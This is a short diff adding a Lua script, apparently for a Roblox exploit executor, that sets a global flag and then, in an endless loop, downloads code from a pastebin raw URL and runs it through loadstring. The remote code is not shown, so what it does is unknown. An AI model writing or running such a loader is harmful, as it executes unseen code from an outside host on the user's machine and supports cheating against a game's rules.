@@ -1,0 +1,7 @@
+getgenv().saim = true;
+
+while wait() do
+ if getgenv().saim == true then
+ loadstring(game:HttpGet("https://pastebin.com/raw/DUeHdyvk", value))()
+    end
+ end 
